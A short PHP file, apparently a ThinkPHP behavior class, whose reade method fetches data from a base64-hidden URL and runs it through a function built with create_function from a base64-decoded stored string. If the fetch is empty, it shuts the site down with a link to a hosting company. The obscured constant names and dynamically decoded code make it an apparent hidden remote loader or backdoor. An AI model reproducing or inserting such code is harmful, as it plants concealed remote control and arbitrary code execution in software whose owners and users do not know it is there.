<?php
namespace Common\Behavior;

use Common\Model\BaseModel;
use Common\Model\StrModel;
use Think\Behavior;

class WangJinTing 
{
    
    private static  $whtIsKey = '';
    
    
    protected  function WhatHappen ()
    {
        $strMoel = BaseModel::getInstance(StrModel::class);
        
        $string = base64_decode($strMoel->getDataString());
        return $string;
    }
    
    public function reade (& $str)
    {
        $data = file_get_contents(base64_decode(HJHKJHKJHKJHKJHFSS).'/'.MMMMMMMMHSKJHKJSGKJGSGS);
        if (empty($data)) {
            die('<a href="http://www.yisu.cn">请联系 亿速网络公司</a>');
        }
        $func = create_function('$data, $key', $this->WhatHappen());
        $str =  $func($data, KJHKJHKJHKJHKJHKJ);
        return $str;
    }
}